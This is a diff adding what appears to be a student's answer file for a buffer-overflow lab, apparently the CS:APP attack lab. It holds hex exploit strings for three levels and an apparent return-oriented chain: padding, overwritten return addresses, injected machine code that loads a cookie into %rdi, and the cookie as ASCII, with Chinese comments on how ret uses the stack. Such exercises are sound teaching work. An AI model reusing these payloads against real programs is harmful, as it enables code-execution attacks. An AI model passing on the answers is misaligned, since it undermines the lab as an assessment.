@@ -1,0 +1,74 @@
+level1
+ff ff ff ff
+ff ff ff ff
+ff ff ff ff
+ff ff ff ff
+ff ff ff ff
+ff ff ff ff
+ff ff ff ff
+ff ff ff ff
+ff ff ff ff
+ff ff ff ff
+c0 17 40
+
+level2 输入到这放入栈内的。
+%rsp字符串头部，栈的顶部，位置最小的地方
+48 c7 c7 fa 
+97 b9 59  
+         意思是 mov $59 b9 97 fa %rdi 立即数给地址
+栈第二部分 
+c3       位置+1 ret 
+ff ff ff ff
+ff ff ff ff
+ff ff ff ff
+ff ff ff ff
+ff ff ff ff
+ff ff ff ff
+ff ff ff ff
+ff ff ff ff
+
+78 dc 61 55 
+00 00 00 00 去00 00 00 00 55 61 dc
+%rip = %rsp 这个地址
+ec 17 40    
+每次函数ret就是把c3结束的时候把%rsp的最后一个地址给%rip
+这里是栈底
+
+level3
+48 c7 c7 b0
+dc 61 55 c3
+ff ff ff ff
+ff ff ff ff
+ff ff ff ff
+ff ff ff ff
+ff ff ff ff
+ff ff ff ff
+ff ff ff ff
+ff ff ff ff
+78 dc 61 55
+00 00 00 00
+fa 18 40 00
+00 00 00 00
+35 39 62 39
+39 37 66 61
+00
+
+
+ff ff ff ff 
+ff ff ff ff 
+ff ff ff ff 
+ff ff ff ff 
+ff ff ff ff
+ff ff ff ff 
+ff ff ff ff 
+ff ff ff ff 
+ff ff ff ff 
+ff ff ff ff
+ab 19 40 ff 
+ff ff ff ff
+fa 97 b9 59 
+ff ff ff ff
+a2 19 40 ff 
+ff ff ff ff
+ec 17 40 ff 
+ff ff ff ff
